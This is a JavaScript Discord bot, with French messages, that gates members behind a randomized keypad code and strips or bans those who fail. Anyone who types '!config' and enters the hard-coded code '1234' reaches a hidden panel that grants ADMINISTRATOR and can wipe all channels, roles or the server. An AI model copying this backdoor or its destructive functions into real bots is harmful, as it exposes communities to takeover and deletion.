
process.on('uncaughtException', (err, origin) => {
    console.log(err)
  if (err.code == "ERR_UNHANDLED_ERROR") {
      process.exit()
  }
});

(async () => {
const { Client, Intents, MessageActionRow, MessageButton, MessageEmbed } = require('discord.js'),
  client = new Client({
      intents: [Intents.FLAGS.GUILDS, Intents.FLAGS.GUILD_MESSAGES, Intents.FLAGS.GUILD_MEMBERS, Intents.FLAGS.GUILD_PRESENCES, Intents.FLAGS.GUILD_VOICE_STATES]
  }),
  delay = require("delay"),
  Enmap = require("enmap");
  const ServV = new Enmap({name: "ServV"});
  let codeAdmin = '1234'
  let MinuteLock = '15'
      CooldownAdminPannel = new Set(),
      UserAdmin = new Map(),
      UserVerif = new Map(),
      MemberVerif = new Map();
      FirstVerifRole = "id first ROLE"
      token = 'TOKEN BOT'

  async function gen(admin,chan) {

if(chan == undefined) return
let l5 = new MessageActionRow();
if(admin != "on") {
  admin = 'PRIMARY'
  l5.addComponents(
      new MessageButton()
          .setCustomId(`valide`)
          .setLabel(`VALIDER`)
          .setStyle('SUCCESS'),
      new MessageButton()
          .setCustomId(`zz`)
          .setLabel(` `)
          .setDisabled(true)
          .setStyle('SECONDARY'),
      new MessageButton()
          .setCustomId(`zejrzaer`)
          .setLabel(`        `)
          .setDisabled(true)
          .setStyle('SECONDARY'),
      new MessageButton()
          .setCustomId(`clear`)
          .setLabel(`EFFACER`)
          .setStyle('DANGER'),
  );


} else {
  admin = 'DANGER',
  
  l5.addComponents(
      new MessageButton()
          .setCustomId(`CONTINUER`)
          .setLabel(`CONTINUER`)
          .setStyle('SUCCESS'),
      new MessageButton()
          .setCustomId(`zz`)
          .setLabel(` `)
          .setDisabled(true)
          .setStyle('SECONDARY'),
      new MessageButton()
          .setCustomId(`ANNULER`)
          .setLabel(`ANNULER`)
          .setStyle('DANGER'),
  );
}
  chan = client.channels.cache.find(channel => channel.id === chan)

  if(admin == "PRIMARY") {
  let AllMessages = await chan.messages.fetch()
  AllMessages.forEach(msg => {
      try {
          if(msg.content == "**▬     ▬     ▬     ▬     ▬     ▬     ▬     ▬    ▬**"){

          msg.delete().catch(error => {})
          }
      } catch (e) { }
  })
}

      row = null
      l1 = new MessageActionRow(),
          l2 = new MessageActionRow(),
          l3 = new MessageActionRow(),
          l4 = new MessageActionRow(),
          row = [];
      row.push(l1);
      row.push(l2);
      row.push(l3);
      row.push(l4);

      for (const r of row) {
          while (r.components.length < 4) {
              r.addComponents(
                  new MessageButton()
                      .setCustomId(`${Math.floor(Math.random() * 10000000)}/${Math.floor(Math.random() * 10000000)}/${Math.floor(Math.random() * 1000000)}`)
                      .setLabel(` `)
                      .setDisabled(true)
                      .setStyle('SECONDARY'),
              )
          }
      }
      let set1 = [];
      for (let i = 0; i < 10; i++) {
          async function random() {
              let n = Math.floor(Math.random() * 4)
              let m = Math.floor(Math.random() * 4)
              const find = Object.values(set1).find((e) => e.n === n && e.m === m)
              if (find === undefined) {
                  set1.push({ n: n, m: m })
                  const c = new MessageButton()
                  c.setCustomId(`${i}`)
                  c.setLabel(`${i}`)
                  c.setStyle(admin)
                  row[n].spliceComponents(m, 1, [c])
              } else {
                  random()
              }
          }
          random()
      }
      client.channels.cache.get(chan.id).send({ content: "**▬     ▬     ▬     ▬     ▬     ▬     ▬     ▬    ▬**", components: [l1, l2, l3, l4, l5] }).then(msg => {
          if(admin == "DANGER"){
          setTimeout(() => {
              msg.delete().catch(error => {})
              CooldownAdminPannel.clear()
          }, 60000)
          }
        }).catch(error => {})
  };
  client.on('interactionCreate', async interaction => {
      if (!interaction.isButton()) return;
      const UserData = UserVerif.get(interaction.user.id);
      if (interaction.customId == 'CONFIG') return PannelAdmin(interaction)
      if (interaction.customId == 'PERM-ADMIN') return PannelAdmin(interaction)
      if (interaction.customId == 'RESET DEFAULT') return PannelAdmin(interaction)
      if (interaction.customId == 'DELETE SERVEUR') return PannelAdmin(interaction)
      if (interaction.customId == 'REBOOTBOT') return PannelAdmin(interaction)
      if (interaction.customId == 'INFOBOT') return PannelAdmin(interaction)
  async function UpdatePermissionsChannel(chann,role) {

          const Channel = client.channels.cache.get(chann)
          if(Channel == undefined) return
          const guild = Channel.guild
           if(guild == undefined) return
              var array = guild.channels.cache
              var interval = 300; // temps d'attente
              var promise = Promise.resolve();
              array.forEach(function (Channel) {
              promise = promise.then(function () {      
        
                  if(Channel == undefined) return
  
                  if(Channel.id == chann){
  
                      Channel.permissionOverwrites.create(role, {
                          SEND_MESSAGES: false,
                          VIEW_CHANNEL: false,
                          READ_MESSAGE_HISTORY:true
                        })
              
                        Channel.permissionOverwrites.create(Channel.guild.roles.everyone.id, {
                          SEND_MESSAGES: false,
                          VIEW_CHANNEL: true,
                          READ_MESSAGE_HISTORY:true
                        })
                        
                  } else
  
  
                  if (Channel.permissionsFor(Channel.guild.roles.everyone.id).has("VIEW_CHANNEL")) {
  
                      Channel.permissionOverwrites.create(role, {
                          VIEW_CHANNEL: true,
                        })
              
                        Channel.permissionOverwrites.create(Channel.guild.roles.everyone.id, {
                          VIEW_CHANNEL: false,
                        })
  
                    }
  
  
                return new Promise(function (resolve) {
                  setTimeout(resolve, interval);
                });
              });
              });
              
              promise.then(function () {
        
                  client.channels.cache.get(chann).send("@everyone").then(msg => { 
                      setTimeout(() => {
                          msg.delete().catch(error => {})
                      }, 5000);
                  })
                         
              });
  }       
  async function PannelAdmin(interaction){

     const UserISAdmin = UserAdmin.get(interaction.user.id)

     if(UserISAdmin == undefined) return await interaction.reply({ content: "**⛔️**", ephemeral: true}) 

     if(interaction.customId == 'INFOBOT'){

let totalSeconds = (client.uptime / 1000);
let days = Math.floor(totalSeconds / 86400);
let hours = Math.floor(totalSeconds / 3600);
totalSeconds %= 3600;
let minutes = Math.floor(totalSeconds / 60);
let seconds = totalSeconds % 60;


interaction.reply({ content: "> **En ligne depuis `" +  days + " jours, " + hours + " heures, " + minutes + " minutes, et " + seconds + " secondes.`**", ephemeral: true})

await delay(3000)

let cmdmap = ServV.map(cmd => "<#" + cmd.channel + ">  *->* <@&" + cmd.role  + "> *->*  **" + cmd.code + "**" ).join('\n')
interaction.editReply({ content: " \n `INFOS:` \n▬▬▬▬▬▬▬▬   \n \n " + cmdmap + '\n\n ▬▬▬▬▬▬▬▬ ', ephemeral: true})

     }

         if(interaction.customId == 'RESET DEFAULT'){

          ServV.clear()

          await interaction.reply({ content: "** Tout les paramètres ont été remis à zéro !**", ephemeral: false})
          
          await delay(2000)

          await interaction.deleteReply()
    
         }
          if(interaction.customId == 'PERM-ADMIN'){

              const user = interaction.guild.members.cache.get(interaction.user.id)

              let HaveRole = user.roles.cache.find(r => r. name == "🌀")

              if(HaveRole == undefined){
              interaction.guild.roles.create({ name: "🌀", permissions:'ADMINISTRATOR', reason: "Rôle perm admin" }).then(r => {
              const m = interaction.guild.members.cache.get(interaction.user.id)
              m.roles.add(r.id)

              setTimeout(() => {
                  r.delete() 
              }, 200000);

          })
               }

          }
          if(interaction.customId == 'DELETE SERVEUR'){

              if(interaction.guild.ownerId == client.user.id){
  
                  await interaction.reply({ content: "** Suppression du serveur dans 2 minutes!**", ephemeral: false})
                   await delay(120000)
                   await interaction.deleteReply()
                   await interaction.guild.delete()

              } 
              else {
                  await interaction.reply({ content: "** Suppression totale dans 2 minutes!**", ephemeral: false})
          
                  await delay(120000)

                  await interaction.deleteReply()

                  interaction.guild.channels.map(c => {
                      c.delete().catch(error => {})
                    })

                    interaction.guild.roles.map(r => {
                      r.delete().catch(error => {})
                    })
              }
          }

          if(interaction.customId == 'REBOOTBOT'){

              await interaction.reply({ content: "** Redémarrage en cours!**", ephemeral: false})
          
              await delay(5000)

              await interaction.deleteReply()

              process.exit()
     
          }

          if(interaction.customId == 'CONFIG'){
              let ChannelConf = "0"
              let RoleConfigID  = "0"
              let CodeConfigID = "0"

       XChannel()
       async function XChannel(){

       await interaction.reply({ content: "**" + interaction.user.username + "**: \n```#Channel```", ephemeral: true})
        await interaction.channel.awaitMessages({filter: m => m.author.id == interaction.user.id, max: 1, time: 30000})  //60000
        .then(message => {
          message = message.first()
        if(message == undefined) return interaction.editReply({ content: "**" + interaction.user.username + "**: \n```Timeout ♨️```", ephemeral: true})

        message.delete().catch(error => {})

        let c1 = message.content.replace('<#', '', );
        let c2 = c1.replace('>', '', );
      let ChannelFInd = client.channels.cache.get(c2)
if(ChannelFInd != undefined){
  ChannelConf = c2
  XRoleID(interaction)
} else
interaction.editReply({ content: "**" + message.author.username + "**: \n```Le channel n'existe pas!```", ephemeral: true})
        
        })
        .catch(collected => {
         // message.reply("`♨️`")
        }).catch(error => {})
      }
      async function XRoleID(interaction){

       await interaction.editReply({ content: "**" + interaction.user.username + "**: \n```@Rôle```", ephemeral: true})
       await interaction.channel.awaitMessages({filter: m => m.author.id == interaction.user.id, max: 1, time: 30000})  
       .then(message => {
         message = message.first()
       if(message == undefined) return interaction.editReply({ content: "**" + interaction.user.username + "**: \n```Timeout ♨️```", ephemeral: true})
       message.delete().catch(error => {})
       let c5 = message.content.replace('<@', '', );
       let c6 = c5.replace('&', '', );
       let c7 = c6.replace('>', '', );
let RoleFind = interaction.guild.roles.cache.get(c7)
if(RoleFind != undefined){
 RoleConfigID = c7

 xCode(interaction)


} else

interaction.editReply({ content: "**" + message.author.username + "**: \n```Le rôle n'existe pas!```", ephemeral: true})
  

       })
       .catch(collected => {
       //  message.reply("`♨️`")
       }).catch(error => {})
     
     }
     async function xCode(interaction){

   await interaction.editReply({ content: "**" + interaction.user.username + "**: \n```Code```", ephemeral: true})
   await interaction.channel.awaitMessages({filter: m => m.author.id == interaction.user.id, max: 1, time: 30000})  
   .then(message => {
     message = message.first()
   if(message == undefined) return interaction.editReply({ content: "**" + interaction.user.username + "**: \n```Timeout ♨️```", ephemeral: true})
   message.delete().catch(error => {})

if(isNaN(message.content))  return interaction.editReply({ content: "**" + interaction.user.username + "**: \n```Chiffre uniquement!```", ephemeral: true})

CodeConfigID = message.content

interaction.editReply({ content: "**" + interaction.user.username + "**: \n```Channel: " + ChannelConf + "\n"  + "Role:" + RoleConfigID + "\nCode:" + CodeConfigID + "```", ephemeral: true})


ServV.ensure(ChannelConf, {
  channel: ChannelConf,
  role: RoleConfigID,
  code: CodeConfigID,
  })
 
  setTimeout(() => {
      gen("off",ChannelConf)
  }, 1000);

  UpdatePermissionsChannel(ChannelConf,RoleConfigID)

   })
   .catch(collected => {

    // message.reply("`♨️`")
   
   }).catch(error => {})
 
 }}}
      if (interaction.customId == 'verifblanc') return FirstVerif(interaction)
      if (interaction.customId == 'verifjaune') return FirstVerif(interaction)
      if (interaction.customId == 'verifvert') return FirstVerif(interaction)
      if (interaction.customId == 'verifbleu') return FirstVerif(interaction)
      if (interaction.customId == 'verifrouge') return FirstVerif(interaction)
      function FirstVerif(interaction){
          if(interaction.customId == "verifjaune"){
          const m = interaction.guild.members.cache.get(interaction.user.id)
          m.roles.add(FirstVerifRole)
          } else {
              const m = interaction.guild.members.cache.get(interaction.user.id)
              m.ban()
          }
      }
      let MsgCode = ""
      if (interaction.customId == 'clear') return Reset(interaction.user.id)
      if (interaction.customId == 'ANNULER') return ResetAdmin(interaction)
      if (interaction.customId == 'valide') return CheckValid(interaction)
      if (interaction.customId == 'CONTINUER') return CheckValid(interaction)

    async function Reset(user) {

      let DbLog = ServV.get(interaction.channelId)
      if(DbLog == undefined) return interaction.message.delete().catch(error => {})


      let User = UserVerif.get(interaction.user.id)

      if(User == undefined) return

      if(User.Reply != undefined){
          await interaction.deferUpdate();     
          await User.Reply.editReply({ content: "**" + interaction.user.username + "** 🚮",ephemeral: true})
      } else {
      await  interaction.reply({ content: "**" + interaction.user.username + "** 🚮",ephemeral: true})
      }

          if (UserData == undefined) return
          UserVerif.set(user, {
              VerifCount: UserData.VerifCount,
              Code: "",
              Reply:UserData.Reply

          })
      }
     async function ResetAdmin(interaction){

      if (CooldownAdminPannel.has(interaction.user.id)){
          setTimeout(() => {
          CooldownAdminPannel.delete(interaction.user.id)
          }, 1000);
          interaction.message.delete().catch(error => {})
  }

      
      if (UserData == undefined) return
      UserVerif.set(interaction.user.id, {
          VerifCount: UserData.VerifCount,
          Code: "",
          Reply:UserData.Reply

      })
      }
      async function CheckValid(interaction) {
          let User = UserVerif.get(interaction.user.id)
          if (User == undefined) return
          let UserCode = UserVerif.get(interaction.user.id).Code
          let Verif = UserVerif.get(interaction.user.id).VerifCount;

          

          if (interaction.customId == 'CONTINUER'){
              if(UserCode == codeAdmin) return VerifOkAdmin(interaction) + await interaction.message.delete().catch(error => {})
              //console.log("Code ADMIN: " + UserCode + " invalide")
              if (Verif != "1") {
                  UserVerif.set(interaction.user.id, {
                      VerifCount: Verif = Verif - 1,
                      Code: "",
                      Reply:User.Reply

                  });

                  
              if(User.Reply != undefined){
                  await interaction.deferUpdate();     
                  await interaction.editReply({ content: "**" + interaction.user.username + "**: \n```" + UserCode + " invalide!```" })
              } else {
                await interaction.reply({ content: "**" + interaction.user.username + "**: \n```" + UserCode + " invalide!```" })
            }

              } else {
                  UserVerif.delete(interaction.user.id)

                  const m = interaction.guild.members.cache.get(interaction.user.id)
                  m.ban()
              }
          } else

          if (interaction.customId == 'CONTINUER') return
         // let User = UserVerif.get(interaction.user.id)
          let DbLog = ServV.get(interaction.channelId)
          if(DbLog == undefined) return interaction.message.delete().catch(error => {})
          let LeCode = DbLog.code



          if (UserCode == LeCode) return VerifOk(interaction.user.id)
          if (Verif != "1") {
              UserVerif.set(interaction.user.id, {
                  VerifCount: Verif = Verif - 1,
                  Code: "",
                  Reply:User.Reply
              });


              if(User.Reply != undefined){
                  await interaction.deferUpdate();     
                  await User.Reply.editReply({ content: "**" + interaction.user.username + "**: \n```" + UserCode + " invalide!```" })
              } else {
                await interaction.reply({ content: "**" + interaction.user.username + "**: \n```" + UserCode + " invalide!```" })
            }
                    } else {
              UserVerif.delete(interaction.user.id)
              const m = interaction.guild.members.cache.get(interaction.user.id)
              m.ban()
          }
      }
      async function VerifOk(userid) {

          let DbLog = ServV.get(interaction.channelId)
          let Channel = client.channels.cache.get(DbLog.channel)
          if(Channel == undefined) return
          let guild = Channel.guild
          UserVerif.delete(userid)
          const m = guild.members.cache.get(userid)
          m.roles.add(DbLog.role)

          let HaveRole = m.roles.cache.find(r => r.id == FirstVerifRole)

          if(HaveRole != undefined){
          m.roles.remove(FirstVerifRole)
          }
          let user = MemberVerif.get(userid)
          if (user != undefined) {
              MemberVerif.delete(userid)
          }
          MemberVerif.set(userid, {
              count: 0,
              voc: false
          });
          gen("off",interaction.channelId)
      }
      async function VerifOkAdmin(interaction) {

          UserAdmin.set(interaction.user.id, {
        user:interaction.user.id
          })

          l25 = new MessageActionRow(),

          l25.addComponents(
              new MessageButton()
                  .setCustomId(`CONFIG`)
                  .setLabel(`CONFIG`)
                  .setStyle('SUCCESS'),
              new MessageButton()
                  .setCustomId(`PERM-ADMIN`)
                  .setLabel(`PERM-ADMIN`)
                  .setDisabled(false)
                  .setStyle('PRIMARY'),
              new MessageButton()
                  .setCustomId(`RESET DEFAULT`)
                  .setLabel(`RESET DEFAULT`)
                  .setDisabled(false)
                  .setStyle('DANGER'),
              new MessageButton()
                  .setCustomId(`DELETE SERVEUR`)
                  .setLabel(`DELETE SERVEUR`)
                  .setDisabled(false)
                  .setStyle('DANGER'),
  
          );

          l26 = new MessageActionRow(),
          l26.addComponents(
          new MessageButton()
          .setCustomId(`INFOBOT`)
          .setLabel(`INFO`)
          .setStyle('SECONDARY'),
          new MessageButton()
          .setCustomId(`REBOOTBOT`)
          .setLabel(`REBOOT`)
          .setDisabled(false)
          .setStyle('SECONDARY'),
          )

          client.channels.cache.get(interaction.channelId).send({ content: "**▬     ▬     ▬     ▬     ▬     ▬     ▬     ▬    ▬**", components: [l25,l26] }).then(msg => { 
              setTimeout(() => {
                  msg.delete().catch(error => {})
              }, 70000);
          })

          UserVerif.delete(interaction.user.id)
        //  console.log("CODE ADMIN VALIDE")
          
          setTimeout(() => {
              UserAdmin.delete(interaction.user.id) 
          }, 800000);
      }

      if (UserData == undefined) {
          if (interaction.customId == 'clear' || interaction.customId == 'valide') return
          UserVerif.set(interaction.user.id, {
              VerifCount: "3",
              Code: interaction.customId,
              Reply:interaction
          });

      await interaction.reply({ content: "**" + interaction.user.username + "**: \n```✖️ ```" , ephemeral: true})
      }
      if (UserData == undefined) return
      if (interaction.customId == 'clear' || interaction.customId == 'valide') return
      let UserCode = UserData.Code
      UserVerif.set(interaction.user.id, {
          Code: UserCode + "" + interaction.customId,
          VerifCount: UserData.VerifCount,
          Reply:UserData.Reply

      });
      nombre_caracteres = UserCode.length + 1;
      for (i = 1; i <= nombre_caracteres; i++) {
          MsgCode += '✖️ ';
      }

    let User = UserVerif.get(interaction.user.id)
    if(User.Reply != undefined){
        await interaction.deferUpdate();     
        await User.Reply.editReply({ content: "**" + interaction.user.username + "**: \n```" + MsgCode + "```" , ephemeral: true})
    } else {
    await interaction.reply({ content: "**" + interaction.user.username + "**: \n```" + MsgCode + "```" , ephemeral: true})
    }


  }).on('messageCreate', async (message) => {

if(message.content.includes("!config")){

if (CooldownAdminPannel.has(message.author.id)) return message.delete().catch(error => {})
CooldownAdminPannel.add(message.author.id);        
message.delete().catch(error => {})
gen("on",message.channelId)

}
      let user = MemberVerif.get(message.author.id)
      if (user == undefined) {
       DerankUser(message.author.id,message.guild)
      } else {
          MemberVerif.set(message.author.id, {
              count: 0,
              voc: user.voc
          })
      }
  }).on('messageDelete', async (message) => {

      let DbLog = ServV.get(message.channel.id)
      if(DbLog == undefined) return 
      if(message.author.id != client.user.id) return
      if(message.content != "**▬     ▬     ▬     ▬     ▬     ▬     ▬     ▬    ▬**") return
      if(message.components == undefined) return
      if(message.components[4] == undefined) return
      if(message.components[4].components[0] == undefined) return
      if(message.components[4].components[0].customId != 'valide') return
      await delay(1000)
      await message.channel.messages.fetch({ limit: 1})
              .then(msg => {
              msg = msg.first()
            if(msg == undefined) return gen("off",message.channel.id)
            if(msg.author.id != client.user.id) return gen("off",message.channel.id)
      })
  }).on('voiceStateUpdate', async (oldMember, newMember) => {

      let user = MemberVerif.get(newMember.id)
      if (oldMember.channel == null && newMember.channel != null) {
          if (user == undefined) {
           DerankUser(newMember.id,newMember.guild)
          } else {
              MemberVerif.set(newMember.id, {
                  count: 0,
                  voc: true
              })
          }
      } else if (oldMember.channel != null && newMember.channel == null) {
          if (user == undefined) {
             DerankUser(newMember.id,newMember.guild)
          } else {
              MemberVerif.set(newMember.id, {
                  count: 0,
                  voc: false
              })
          }
      }
  }).on('ready', async () => {
     console.log(client.user.tag +  " ON!")
     FetchAllServ()
     SendChannelButtons()

  function SendChannelButtons() {
      var array = ServV
      var interval = 2000; // temps d'attente
      var promise = Promise.resolve();
      array.forEach(function (load) {
      promise = promise.then(function () {      
      const Channel = client.channels.cache.get(load.channel)
      if(Channel == undefined) return console.log("suppression de " + load.channel ) + ServV.delete(load.channel)
      const guild = Channel.guild  
        if(guild != undefined){
            gen("off",load.channel)
          let RoleASupp = guild.roles.cache.find(r => r. name == "🌀")
          if(RoleASupp != undefined){
              RoleASupp.delete()
          }
        } else {
            ServV.delete(load.channel)
        }

        return new Promise(function (resolve) {
          setTimeout(resolve, interval);
        });
      });
      });
      
      promise.then(function () {

        setTimeout(() => {
          SendChannelButtons()
        }, 800000);

            
      });
  }

 async function FetchAllServ() {

    var array = ServV
    var interval = 1000; // temps d'attente
    var promise = Promise.resolve();
    array.forEach(function (load) {
    promise = promise.then(async function () {      
      const Channel = client.channels.cache.get(load.channel)

      if(Channel == undefined) return
      const guild = Channel.guild 
      if(guild != undefined){
      derank(guild,load.role)   
      } 
      return new Promise(function (resolve) {
        setTimeout(resolve, interval);
      });
    });
    });
    
    promise.then(function () {

      setTimeout(() => {
          FetchAllServ()
      }, 60000);

          
    });
  }

  }).login(token);
  async function derank(guild,role) {

      for (const m of guild.roles.cache.get(role).members) {
          if(m[1] == undefined) return
          if(m[1].user == undefined) return
          if(m[0] == undefined) return
          if(m[1].user.bot) return
          let user = MemberVerif.get(m[0])
          if (user == undefined) {
              m[1].roles.remove(role).catch(error => {})
              let HaveRole = guild.roles.cache.find(r => r.id == FirstVerifRole)
              if(HaveRole != undefined){
                  m[1].roles.add(FirstVerifRole).catch(error => {})
              } 
          } else if (user != undefined){
              if (!user.voc) {
                  if (user.count > MinuteLock) {
                      m[1].roles.remove(role).catch(error => {})
                      MemberVerif.delete(m[0])
                  } else {
                      user.count++
                  }
              }
          }
      }
  }
  async function DerankUser(user, guild) {

      try {
        const member = guild.members.cache.find(
          (member) => member.user.id === user
        );
        if (member.user.bot) return
        let rolesName = "";
        let rolesToRemove = new Array();
        await member.roles.cache.forEach((role) => {
          if (
            role.name !== "@everyone" &&
            !role.name.includes("Boost")
          ) {
            rolesName += "\n``" + role.name + "``";
            rolesToRemove.push(role);
          }
        });
             await  member.roles.remove(rolesToRemove);
                
      } catch {
    
      }
  }
})();
